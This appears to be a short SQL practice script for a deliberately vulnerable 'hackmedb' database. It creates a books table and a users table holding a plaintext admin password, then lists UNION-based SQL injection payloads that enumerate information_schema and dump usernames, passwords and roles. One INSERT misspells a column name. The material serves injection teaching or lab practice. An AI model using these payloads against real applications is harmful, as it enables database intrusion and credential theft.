create database hackmedb
use hackmedb
CREATE TABLE books (id INT AUTO_INCREMENT PRIMARY KEY, name VARCHAR(255), author VARCHAR(255))
INSERT INTO books (name, authoer) VALUES ('Sapiens', 'Yuval Noah Harari')

CREATE TABLE users (id INT AUTO_INCREMENT PRIMARY KEY, username VARCHAR(255), password VARCHAR(255), role VARCHAR(255))
INSERT INTO users (username, password, role) VALUES ('john', 'john123', 'ADMIN')
	

SELECT * FROM books where NAME LIKE '%Sap%' OR '1'='1'; -- %'

SELECT * FROM books where NAME LIKE '%Sap%' UNION (SELECT 1,2,3 FROM dual); -- %'

SELECT * FROM books where NAME LIKE '%Sap%' UNION (SELECT TABLE_NAME, TABLE_SCHEMA, 3 FROM information_schema.tables); -- %'

SELECT * FROM books where NAME LIKE '%Sap%' UNION (SELECT COLUMN_NAME, 2, 3 FROM information_schema.columns WHERE TABLE_NAME = 'users'); -- %'

SELECT * FROM books where NAME LIKE '%Sap%' UNION (SELECT username, password, role FROM users); -- %'